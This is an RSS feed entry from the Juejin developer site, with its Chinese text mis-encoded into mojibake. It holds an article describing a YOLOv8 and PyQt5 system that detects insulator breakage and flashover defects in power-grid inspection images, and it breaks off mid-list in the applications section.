<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[åŸºäº YOLOv8 çš„ç”µç½‘ç»ç¼˜å­ç ´æŸä¸é—ªç»œç¼ºé™·æ™ºèƒ½æ£€æµ‹ç³»ç»Ÿè¯†åˆ«é¡¹ç›® [ç›®æ ‡æ£€æµ‹å®Œæ•´æºç ]]]></title>    <link>https://juejin.cn/post/7597622924272697371</link>    <guid>https://juejin.cn/post/7597622924272697371</guid>    <pubDate>2026-01-21T13:03:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597622924272697371" data-draft-id="7597622924272680987" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäº YOLOv8 çš„ç”µç½‘ç»ç¼˜å­ç ´æŸä¸é—ªç»œç¼ºé™·æ™ºèƒ½æ£€æµ‹ç³»ç»Ÿè¯†åˆ«é¡¹ç›® [ç›®æ ‡æ£€æµ‹å®Œæ•´æºç ]"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T13:03:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ‘æ˜¯æ°å°¼"/> <meta itemprop="url" content="https://juejin.cn/user/4200579899599495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäº YOLOv8 çš„ç”µç½‘ç»ç¼˜å­ç ´æŸä¸é—ªç»œç¼ºé™·æ™ºèƒ½æ£€æµ‹ç³»ç»Ÿè¯†åˆ«é¡¹ç›® [ç›®æ ‡æ£€æµ‹å®Œæ•´æºç ]
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4200579899599495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ‘æ˜¯æ°å°¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T13:03:42.000Z" title="Wed Jan 21 2026 13:03:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŸºäº YOLOv8 çš„ç”µç½‘ç»ç¼˜å­ç ´æŸä¸é—ªç»œç¼ºé™·æ™ºèƒ½æ£€æµ‹ç³»ç»Ÿè¯†åˆ«é¡¹ç›® [ç›®æ ‡æ£€æµ‹å®Œæ•´æºç ]</h2>
<h3 data-id="heading-1">ä¸€ã€ç ”ç©¶èƒŒæ™¯ä¸å·¥ç¨‹é—®é¢˜åˆ†æ</h3>
<p>éšç€ç”µåŠ›ç³»ç»Ÿè§„æ¨¡çš„ä¸æ–­æ‰©å¤§ï¼Œè¾“ç”µçº¿è·¯å’Œå˜ç”µè®¾å¤‡çš„è¿è¡Œå®‰å…¨å·²æˆä¸ºç”µç½‘è¿ç»´ä¸­çš„æ ¸å¿ƒé—®é¢˜ä¹‹ä¸€ã€‚åœ¨ä¼—å¤šç”µåŠ›è®¾å¤‡ä¸­ï¼Œ<strong>ç»ç¼˜å­</strong>æ‰¿æ‹…ç€ç”µæ°”éš”ç¦»ä¸æœºæ¢°æ”¯æ’‘çš„åŒé‡ä»»åŠ¡ï¼Œå…¶è¿è¡ŒçŠ¶æ€ç›´æ¥å½±å“ç”µç½‘çš„ç¨³å®šæ€§ä¸å¯é æ€§ã€‚</p>
<p>åœ¨é•¿æœŸè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œç»ç¼˜å­é€šå¸¸ä¼šå—åˆ°ä»¥ä¸‹ä¸åˆ©å› ç´ å½±å“ï¼š</p>
<ul>
<li>é•¿æœŸé«˜å‹ç”µåœºä½œç”¨å¯¼è‡´ææ–™è€åŒ–</li>
<li>é£æ²™ã€ç›é›¾ã€å·¥ä¸šæ±¡æŸ“ç‰©é™„ç€</li>
<li>é«˜æ¹¿ç¯å¢ƒä¸‹æ˜“å‘ç”Ÿè¡¨é¢æ”¾ç”µ</li>
<li>å¤–åŠ›å†²å‡»é€ æˆç“·è£™ç ´æŸæˆ–è„±è½</li>
</ul>
<p>ç”±æ­¤äº§ç”Ÿçš„å…¸å‹ç¼ºé™·ä¸»è¦åŒ…æ‹¬ <strong>ç»ç¼˜å­ç ´æŸ</strong> ä¸ <strong>ç»ç¼˜å­é—ªç»œ</strong>ã€‚è¿™ç±»ç¼ºé™·å…·æœ‰éšè”½æ€§å¼ºã€åˆ†å¸ƒèŒƒå›´å¹¿ã€äººå·¥å·¡æ£€æˆæœ¬é«˜ç­‰ç‰¹ç‚¹ï¼Œä¸€æ—¦æœªèƒ½åŠæ—¶å‘ç°ï¼Œææ˜“å¼•å‘çº¿è·¯è·³é—¸ã€è®¾å¤‡æŸæ¯ï¼Œç”šè‡³åŒºåŸŸæ€§åœç”µäº‹æ•…ã€‚</p>
<p>ä¼ ç»Ÿçš„äººå·¥å·¡æ£€æ–¹å¼å·²é€æ¸æš´éœ²å‡ºæ˜æ˜¾ä¸è¶³ï¼š</p>
<ul>
<li>å·¡æ£€æ•ˆç‡éš¾ä»¥è¦†ç›–å¤§è§„æ¨¡çº¿è·¯</li>
<li>é«˜ç©ºã€é‡å¤–ä½œä¸šå­˜åœ¨å®‰å…¨é£é™©</li>
<li>æ£€æµ‹ç»“æœä¾èµ–ä¸ªäººç»éªŒï¼Œç¼ºä¹ä¸€è‡´æ€§</li>
</ul>
<p>åœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œç»“åˆæ— äººæœºå·¡æ£€ã€å›ºå®šæ‘„åƒå¤´é‡‡é›†æ‰‹æ®µï¼Œå¼•å…¥<strong>åŸºäºæ·±åº¦å­¦ä¹ çš„è§†è§‰æ£€æµ‹æŠ€æœ¯</strong>ï¼Œæ„å»ºè‡ªåŠ¨åŒ–ç¼ºé™·è¯†åˆ«ç³»ç»Ÿï¼Œå·²æˆä¸ºæ™ºèƒ½ç”µç½‘å‘å±•çš„é‡è¦æ–¹å‘ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a901862500334de3870fc829cdd18210~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=YXJRj3lXEvAR3li1n3q36sFPPWI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-2">æºç ä¸‹è½½ä¸æ•ˆæœæ¼”ç¤º</h3>
<p>å“”å“©å“”å“©è§†é¢‘ä¸‹æ–¹è§‚çœ‹ï¼š
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1Qk8uz6E9f%2F" target="_blank" title="https://www.bilibili.com/video/BV1Qk8uz6E9f/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Qkâ€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4810ea2df5e4fd5b6b4ecdf82d045c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=5awxg4Dui8SyNRwg9NKVYkZJ3qI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
åŒ…å«ï¼š</p>
<p>ğŸ“¦å®Œæ•´é¡¹ç›®æºç </p>
<p>ğŸ“¦ é¢„è®­ç»ƒæ¨¡å‹æƒé‡</p>
<p>ğŸ—‚ï¸ æ•°æ®é›†åœ°å€ï¼ˆå«æ ‡æ³¨è„šæœ¬</p>
<h3 data-id="heading-3">äºŒã€ç³»ç»Ÿæ€»ä½“è®¾è®¡æ€è·¯</h3>
<p>æœ¬é¡¹ç›®ä»¥ <strong>YOLOv8 ç›®æ ‡æ£€æµ‹æ¨¡å‹</strong> ä¸ºæ ¸å¿ƒç®—æ³•ï¼Œé¢å‘ç”µåŠ›å·¡æ£€åœºæ™¯è¿›è¡Œä¸“é¡¹è®­ç»ƒï¼Œå¹¶é€šè¿‡ <strong>PyQt5 å›¾å½¢ç•Œé¢</strong> å®ç°å®Œæ•´çš„å·¥ç¨‹åŒ–å°è£…ï¼Œæœ€ç»ˆå½¢æˆä¸€å¥—å¯ç›´æ¥æŠ•å…¥ä½¿ç”¨çš„ <strong>ç”µç½‘ç»ç¼˜å­ç¼ºé™·æ™ºèƒ½æ£€æµ‹ç³»ç»Ÿ</strong>ã€‚</p>
<h4 data-id="heading-4">ç³»ç»Ÿè®¾è®¡ç›®æ ‡åŒ…æ‹¬ï¼š</h4>
<ol>
<li><strong>é«˜æ£€æµ‹å‡†ç¡®ç‡</strong>ï¼šèƒ½å¤Ÿç¨³å®šè¯†åˆ«ç ´æŸä¸é—ªç»œç¼ºé™·</li>
<li><strong>å®æ—¶æ¨ç†èƒ½åŠ›</strong>ï¼šæ»¡è¶³è§†é¢‘æµä¸åœ¨çº¿å·¡æ£€éœ€æ±‚</li>
<li><strong>è‰¯å¥½å¯ç”¨æ€§</strong>ï¼šéç®—æ³•äººå‘˜ä¹Ÿå¯ç›´æ¥æ“ä½œ</li>
<li><strong>å¯æ‰©å±•æ€§å¼º</strong>ï¼šä¾¿äºåæœŸæ¨¡å‹å‡çº§ä¸åŠŸèƒ½æ‹“å±•</li>
</ol>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d5247a95cdd43debc9c4b84f1bf4703~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=XRZKfg64z0EFKdCBT937ge4yUGk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-5">ä¸‰ã€æ•´ä½“ç³»ç»Ÿæ¶æ„</h3>
<p>ç³»ç»Ÿé‡‡ç”¨å…¸å‹çš„åˆ†å±‚æ¶æ„è®¾è®¡ï¼Œå„æ¨¡å—èŒè´£æ¸…æ™°ã€ç›¸äº’è§£è€¦ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é‡‡é›†å±‚    â”‚  å›¾åƒ / è§†é¢‘ / æ‘„åƒå¤´ / æ— äººæœº
â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">        â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”
â”‚ YOLOv8 æ¨ç†å±‚ â”‚  ç¼ºé™·æ£€æµ‹ä¸åˆ†ç±»
â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç»“æœè§£æå±‚    â”‚  ç±»åˆ« / ç½®ä¿¡åº¦ / åæ ‡
â””â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PyQt5 ç•Œé¢å±‚  â”‚  å¯è§†åŒ–å±•ç¤ºä¸äº¤äº’
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<p>è¯¥æ¶æ„çš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li>ç®—æ³•æ¨¡å—å¯ç‹¬ç«‹æ›¿æ¢æˆ–å‡çº§</li>
<li>UI ä¸æ¨¡å‹å®Œå…¨è§£è€¦ï¼Œé™ä½ç»´æŠ¤æˆæœ¬</li>
<li>æ”¯æŒæœ¬åœ°éƒ¨ç½²æˆ–åç»­æœåŠ¡åŒ–æ”¹é€ 
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f847c27e45b841f0970f5e43d802743a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=Vkh3DYX3uNEVwD7cSktcxmgbu%2Bk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></li>
</ul>
<hr/>
<h3 data-id="heading-6">å››ã€æ£€æµ‹ç›®æ ‡å®šä¹‰ä¸ä¸šåŠ¡å»ºæ¨¡</h3>
<h4 data-id="heading-7">4.1 ç¼ºé™·ç±»åˆ«å»ºæ¨¡</h4>
<p>ç»“åˆç”µåŠ›è¿ç»´ä¸šåŠ¡éœ€æ±‚ï¼Œæœ¬é¡¹ç›®å…±å®šä¹‰ä¸‰ç±»æ£€æµ‹ç›®æ ‡ï¼š</p>





















<table><thead><tr><th>ç±»åˆ«</th><th>ä¸šåŠ¡å«ä¹‰</th></tr></thead><tbody><tr><td>ç»ç¼˜å­</td><td>æ­£å¸¸å®Œæ•´çš„ç»ç¼˜å­æœ¬ä½“</td></tr><tr><td>ç ´æŸ</td><td>ç“·è£™ç¼ºå¤±ã€è£‚çº¹ã€ç»“æ„ç ´å</td></tr><tr><td>é—ªç»œ</td><td>æ”¾ç”µç—•è¿¹ã€æ±¡æŸ“å¯¼è‡´çš„è¡¨é¢é—ªç»œ</td></tr></tbody></table>
<p>è¿™ç§åˆ†ç±»æ–¹å¼ä¸ä»…èƒ½å¤Ÿè¯†åˆ«ç¼ºé™·ç±»å‹ï¼Œè¿˜å¯ä¸ºåç»­<strong>ç¼ºé™·å®šä½ã€ç»Ÿè®¡åˆ†æä¸é£é™©åˆ†çº§</strong>æä¾›åŸºç¡€æ•°æ®æ”¯æŒã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e788eed04e9240a8a086d26e9c707e15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=Q0kldCr8I0rD3ZTszvx52Uroobg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-8">4.2 æ•°æ®é›†æ„å»ºåŸåˆ™</h4>
<p>ä¸ºäº†ä¿è¯æ¨¡å‹åœ¨å®é™…åœºæ™¯ä¸­çš„æ³›åŒ–èƒ½åŠ›ï¼Œæ•°æ®é›†æ„å»ºé˜¶æ®µé‡ç‚¹è€ƒè™‘ï¼š</p>
<ul>
<li>ä¸åŒæ‹æ‘„é«˜åº¦ï¼ˆæ¨¡æ‹Ÿæ— äººæœºå·¡æ£€ï¼‰</li>
<li>ä¸åŒå…‰ç…§æ¡ä»¶ï¼ˆé€†å…‰ã€é˜´å½±ã€å¼ºåå°„ï¼‰</li>
<li>å¤æ‚èƒŒæ™¯ï¼ˆå±±åœ°ã€æ ‘æ—ã€å»ºç­‘ï¼‰</li>
<li>æ­£å¸¸ä¸ç¼ºé™·æ ·æœ¬çš„åˆç†æ¯”ä¾‹</li>
</ul>
<p>æ•°æ®ç»Ÿä¸€é‡‡ç”¨ YOLO æ ‡å‡†æ ¼å¼ï¼Œä¾¿äºè®­ç»ƒã€æ¨ç†ä¸å·¥ç¨‹å¤ç”¨ã€‚</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b28ef0828e548e2b035033aa4597d4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=ytkH%2FEY5l%2Bais4T24YXuYjv4qDk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-9">äº”ã€YOLOv8 æ¨¡å‹é€‰å‹ä¸è®­ç»ƒæµç¨‹</h3>
<h4 data-id="heading-10">5.1 YOLOv8 åœ¨å·¥ä¸šåœºæ™¯ä¸­çš„ä¼˜åŠ¿</h4>
<p>YOLOv8 ä½œä¸º Ultralytics æ¨å‡ºçš„æ–°ä¸€ä»£æ£€æµ‹æ¨¡å‹ï¼Œåœ¨å·¥ç¨‹å®è·µä¸­å…·å¤‡ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<ul>
<li>Anchor-Free è®¾è®¡ï¼Œå‡å°‘äººå·¥è°ƒå‚</li>
<li>æ›´åˆç†çš„æŸå¤±å‡½æ•°è®¾è®¡ï¼Œæé«˜æ”¶æ•›ç¨³å®šæ€§</li>
<li>æ¨ç†æ¥å£é«˜åº¦å°è£…ï¼Œå·¥ç¨‹æ¥å…¥æˆæœ¬ä½</li>
<li>å…¼å®¹ ONNXã€TensorRT ç­‰å¤šç§éƒ¨ç½²å½¢å¼</li>
</ul>
<p>å¯¹äºç»ç¼˜å­è¿™ç±»<strong>å°ºåº¦å˜åŒ–å¤§ã€å½¢æ€ç»†é•¿ã€èƒŒæ™¯å¤æ‚</strong>çš„ç›®æ ‡ï¼ŒYOLOv8 åœ¨ç²¾åº¦ä¸é€Ÿåº¦ä¹‹é—´å–å¾—äº†è‰¯å¥½å¹³è¡¡ã€‚</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de77e22508cb450f92652bd8a77ace92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=7f%2BgIc87ii7jYuwyi6B%2BKQ5KF08%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h4 data-id="heading-11">5.2 æ¨¡å‹è®­ç»ƒæµç¨‹</h4>
<p>è®­ç»ƒæµç¨‹ä¸»è¦åŒ…æ‹¬ï¼š</p>
<ol>
<li>æ•°æ®æ¸…æ´—ä¸æ ‡æ³¨æ ¡éªŒ</li>
<li>è®­ç»ƒ / éªŒè¯é›†åˆ’åˆ†</li>
<li>æ¨¡å‹åˆå§‹åŒ–ä¸å‚æ•°é…ç½®</li>
<li>å¤šè½®è¿­ä»£è®­ç»ƒä¸æ€§èƒ½è¯„ä¼°</li>
</ol>
<p>è®­ç»ƒè¿‡ç¨‹ä¸­é‡ç‚¹å…³æ³¨ä»¥ä¸‹æŒ‡æ ‡ï¼š</p>
<ul>
<li><code>mAP@0.5</code>ï¼šæ•´ä½“æ£€æµ‹èƒ½åŠ›</li>
<li>æ··æ·†çŸ©é˜µï¼šç ´æŸä¸é—ªç»œçš„åŒºåˆ†æ•ˆæœ</li>
<li>Loss æ›²çº¿ï¼šæ¨¡å‹æ˜¯å¦ç¨³å®šæ”¶æ•›</li>
</ul>
<p>å½“æ¨¡å‹åœ¨éªŒè¯é›†ä¸Šè¡¨ç°ç¨³å®šåï¼Œå³å¯ç”¨äºæ¨ç†éƒ¨ç½²ã€‚</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/732d68378f174b6b992f1949e9c1f01a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=FuMDKCZaqmIFVvI10dBGcyweNb4%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-12">å…­ã€æ¨ç†æµç¨‹ä¸ç¼ºé™·ç»“æœè§£æ</h3>
<p>YOLOv8 æä¾›äº†ç®€æ´é«˜æ•ˆçš„æ¨ç†æ¥å£ï¼Œæ¨ç†é˜¶æ®µä¸»è¦å®Œæˆä»¥ä¸‹å·¥ä½œï¼š</p>
<ul>
<li>åŠ è½½è®­ç»ƒå®Œæˆçš„æƒé‡æ–‡ä»¶</li>
<li>å¯¹è¾“å…¥å›¾åƒæˆ–è§†é¢‘å¸§è¿›è¡Œæ£€æµ‹</li>
<li>è¾“å‡ºç›®æ ‡ç±»åˆ«ã€ç½®ä¿¡åº¦ä¸è¾¹ç•Œæ¡†</li>
</ul>
<p>åœ¨è§†é¢‘ä¸æ‘„åƒå¤´æ¨¡å¼ä¸‹ï¼Œç³»ç»Ÿé‡‡ç”¨é€å¸§æ£€æµ‹æ–¹å¼ï¼Œå¹¶é€šè¿‡åˆç†çš„å¸§ç‡æ§åˆ¶ï¼Œç¡®ä¿æ£€æµ‹æ•ˆæœä¸å®æ—¶æ€§ä¹‹é—´çš„å¹³è¡¡ã€‚</p>
<hr/>
<h3 data-id="heading-13">ä¸ƒã€PyQt5 å›¾å½¢åŒ–ç³»ç»Ÿè®¾è®¡</h3>
<p>ä¸ºäº†æå‡ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œæœ¬é¡¹ç›®å¼•å…¥ PyQt5 æ„å»ºæ¡Œé¢çº§å¯è§†åŒ–åº”ç”¨ï¼Œæ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>å¤šç§æ£€æµ‹æ¨¡å¼åˆ‡æ¢ï¼ˆå›¾ç‰‡ / è§†é¢‘ / æ‘„åƒå¤´ï¼‰</li>
<li>å®æ—¶æ˜¾ç¤ºæ£€æµ‹ç»“æœä¸ç¼ºé™·æ ‡ç­¾</li>
<li>ä¸€é”®ä¿å­˜æ£€æµ‹ç»“æœå›¾ç‰‡æˆ–è§†é¢‘</li>
<li>è‡ªåŠ¨ç®¡ç†è¾“å‡ºç›®å½•ï¼Œä¾¿äºåæœŸå¤æ ¸</li>
</ul>
<p>è¯¥ç•Œé¢è®¾è®¡ä½¿ç³»ç»Ÿèƒ½å¤Ÿç›´æ¥æœåŠ¡äº<strong>è¿ç»´äººå‘˜ä¸å·¡æ£€äººå‘˜</strong>ï¼Œè€Œä¸ä»…ä»…å±€é™äºç®—æ³•ç ”ç©¶ã€‚</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1abe2bb134c24df285f4e4fac7af1663~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605421&amp;x-signature=p%2BCJ19jPzKDFDbr5MD7ITJr6I8E%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h3 data-id="heading-14">å…«ã€å…¸å‹åº”ç”¨åœºæ™¯ä¸æ‰©å±•æ–¹å‘</h3>
<h4 data-id="heading-15">8.1 å®é™…åº”ç”¨åœºæ™¯</h4>
<ul>
<li>è¾“ç”µçº¿è·¯æ— äººæœºå·¡æ£€</li>
<li>å˜ç”µç«™è®¾å¤‡æ—¥å¸¸æ£€æŸ¥</li>
